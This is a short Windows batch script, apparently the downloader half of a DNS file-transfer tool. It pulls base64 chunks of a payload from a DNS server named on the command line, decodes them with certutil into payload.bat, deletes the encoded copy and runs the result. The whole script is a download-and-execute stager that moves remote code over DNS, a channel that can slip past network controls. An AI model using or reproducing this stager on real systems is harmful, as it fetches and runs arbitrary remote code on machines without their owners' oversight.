@echo off
REM Written by Daniel Vinakovsky
REM dvinak@gmail.com
REM http://www.gnurds.com

setlocal EnableDelayedExpansion
set encodedoutfile=outputb64
set rawoutfile=payload.bat
set payloaddnsserver=%1
set pubdnsserver=%3

FOR /L %%I IN (0,1,%2) DO (
	ECHO Downloaded part %%I of %2
	FOR /f "skip=12 usebackq tokens=1" %%a IN (`dnsftp_downloader.bat %%I.%payloaddnsserver% %pubdnsserver%`) DO (
		set tempvar=%%a
		REM strip quotation marks
		set output=!tempvar:"=!
		@echo !output! >> %encodedoutfile%
		)
)
REM base64 decode the downloaded payload, overwrite.
IF EXIST %encodedoutfile% (
	ECHO Decoding downloaded file...
	certutil -decode -f %encodedoutfile% %rawoutfile%
) ELSE (
	ECHO Failed to download file
	EXIT /B 1
)
REM delete the encoded payload
DEL %encodedoutfile%
REM launch the payload
ECHO Attempting to launch file...
start "" "payload.bat"